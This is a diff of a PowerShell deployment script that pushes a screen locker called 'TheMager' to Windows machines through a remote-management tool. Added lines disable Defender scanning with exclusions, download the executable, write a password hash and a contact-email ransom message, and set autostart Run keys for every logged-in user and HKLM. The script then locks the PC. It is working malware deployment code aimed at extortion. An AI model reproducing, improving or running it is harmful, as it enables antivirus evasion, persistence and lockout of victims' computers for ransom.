@@ -1,5 +1,5 @@
-# The Mager - RMM Deploy Script
-# Run as Administrator via your RMM tool
+# The Mager - RMM Deploy Script (Fleet Deck / SYSTEM compatible)
+# Writes startup to ALL logged-in users via HKEY_USERS when running as SYSTEM
 # Usage: deploy_mager.ps1
 
 $ErrorActionPreference = "Continue"
@@ -14,13 +14,11 @@ $message = "contact omarjaziz@proton.me"
 # --- Step 1: Add Defender exclusion BEFORE downloading ---
 Write-Host "[1/5] Adding Windows Defender exclusion..."
 try {
-    # Exclude the install directory
     Add-MpPreference -ExclusionPath $installDir -Force 2>$null
-    # Also exclude the process name
     Add-MpPreference -ExclusionProcess "TheMager.exe" -Force 2>$null
     Write-Host "  Defender exclusions added (path + process)"
 } catch {
-    Write-Host "  WARNING: Could not add Defender exclusion (may not be Defender or no admin)"
+    Write-Host "  WARNING: Could not add Defender exclusion"
 }
 
 # --- Step 2: Download ---
@@ -28,50 +26,101 @@ Write-Host "[2/5] Downloading TheMager.exe..."
 New-Item -ItemType Directory -Path $installDir -Force | Out-Null
 $ProgressPreference = 'SilentlyContinue'
 Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath -UseBasicParsing
-Write-Host "  Downloaded: $([math]::Round((Get-Item $exePath).Length / 1KB, 1)) KB"
+Write-Host "  Downloaded OK"
 
-# --- Step 3: Set Defender to ALLOW this specific file (ASR rules) ---
+# --- Step 3: Add file-level exclusion ---
 Write-Host "[3/5] Adding file-level AV allow..."
 try {
-    # Mark the file as safe (some AV respects this)
-    $fileHash = (Get-FileHash -Path $exePath -Algorithm SHA256).Hash
-    Add-MpPreference -ExclusionExtension "exe" -Force 2>$null
-    # Try Windows Defender Application Control allow
     Add-MpPreference -ExclusionPath $exePath -Force 2>$null
-    Write-Host "  File exclusions applied (SHA256: $($fileHash.Substring(0,16))...)"
+    Write-Host "  File exclusion applied"
 } catch {
     Write-Host "  WARNING: File-level exclusion failed"
 }
 
-# --- Step 4: Deploy with password + message ---
-Write-Host "[4/5] Deploying (setting password, message, startup)..."
-# The --deploy flag sets password hash, message, auto-installs to startup, then locks
-Start-Process -FilePath $exePath -ArgumentList "--deploy --password `"$password`" --message `"$message`"" -WindowStyle Normal
-Write-Host "  Deployed and locked!"
-
-# --- Step 5: Verify ---
-Write-Host "[5/5] Verifying..."
-Start-Sleep -Seconds 2
-
-# Check registry
-$regVal = $null
-try { $regVal = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "TheMager" -ErrorAction SilentlyContinue).TheMager } catch {}
-try { if (-not $regVal) { $regVal = (Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "TheMager" -ErrorAction SilentlyContinue).TheMager } } catch {}
-
-if ($regVal) {
-    Write-Host "  Startup entry: OK ($regVal)"
-} else {
-    Write-Host "  Startup entry: NOT FOUND (may need admin)"
-}
-
-# Check password file
+# --- Step 4: Set password and message ---
+Write-Host "[4/5] Setting password and message..."
 $pwFile = "$env:APPDATA\themager_pw.dat"
-if (Test-Path $pwFile) {
-    Write-Host "  Password: SET"
-} else {
-    Write-Host "  Password: NOT SET"
+$cfgFile = "$installDir\lock_config.json"
+
+$sha256 = [System.Security.Cryptography.SHA256]::Create()
+$hashBytes = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($password))
+$hashHex = [BitConverter]::ToString($hashBytes).Replace("-", "").ToLower()
+Set-Content -Path $pwFile -Value $hashHex -Force
+Write-Host "  Password hash saved"
+
+$msgJson = "{`"message`":`"$message`"}"
+Set-Content -Path $cfgFile -Value $msgJson -Force
+Write-Host "  Message: $message"
+
+# --- Step 5: Add startup for ALL logged-in users ---
+Write-Host "[5/5] Adding startup entry..."
+
+# When running as SYSTEM, HKCU is SYSTEM's hive (not the real user).
+# We must write to HKEY_USERS\{real-user-SID}\...\Run instead.
+
+$hu = [Microsoft.Win32.Registry]::Users
+$subKeys = $hu.GetSubKeyNames()
+$foundUsers = 0
+
+foreach ($sid in $subKeys) {
+    if ($sid -match "_Classes$") { continue }
+    if ($sid -eq "S-1-5-18" -or $sid -eq "S-1-5-19" -or $sid -eq "S-1-5-20") { continue }
+    if ($sid -notmatch "^S-1-5-21-") { continue }
+    
+    $username = $sid
+    try {
+        $acct = New-Object System.Security.Principal.SecurityIdentifier($sid)
+        $username = $acct.Translate([System.Security.Principal.NTAccount]).Value
+    } catch { }
+    
+    # Write startup entry
+    try {
+        $runPath = "$sid\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+        $runKey = $hu.OpenSubKey($runPath, $true)
+        if ($runKey) {
+            $runKey.SetValue("TheMager", "`"$exePath`"")
+            $runKey.Close()
+            Write-Host "  Startup OK: $username"
+            $foundUsers++
+        }
+    } catch { }
+    
+    # Copy password file to user's AppData
+    try {
+        $envKey = $hu.OpenSubKey("$sid\Environment", $false)
+        if ($envKey) {
+            $appData = $envKey.GetValue("APPDATA", $null)
+            $envKey.Close()
+            if ($appData) {
+                $userPwFile = Join-Path $appData "themager_pw.dat"
+                if (-not (Test-Path $userPwFile)) {
+                    Copy-Item $pwFile $userPwFile -Force 2>$null
+                }
+            }
+        }
+    } catch { }
 }
 
+# Also try HKLM as backup
+try {
+    $regKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
+        "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", $true)
+    $regKey.SetValue("TheMager", "`"$exePath`"")
+    $regKey.Close()
+    Write-Host "  HKLM Run: OK (all users fallback)"
+    $foundUsers++
+} catch { }
+
+if ($foundUsers -eq 0) {
+    Write-Host "  WARNING: No startup entries created. May need manual setup."
+}
+
+# --- Lock now ---
+Write-Host ""
+Write-Host "Locking PC..."
+Start-Process -FilePath $exePath -ArgumentList "--deploy --password `"$password`" --message `"$message`"" -WindowStyle Normal
+
+Start-Sleep -Seconds 2
 Write-Host ""
 Write-Host "=== DEPLOY COMPLETE ==="
-Write-Host "PC is now locked. Unlock with: $password"
+Write-Host "PC is locked. Unlock with: $password"
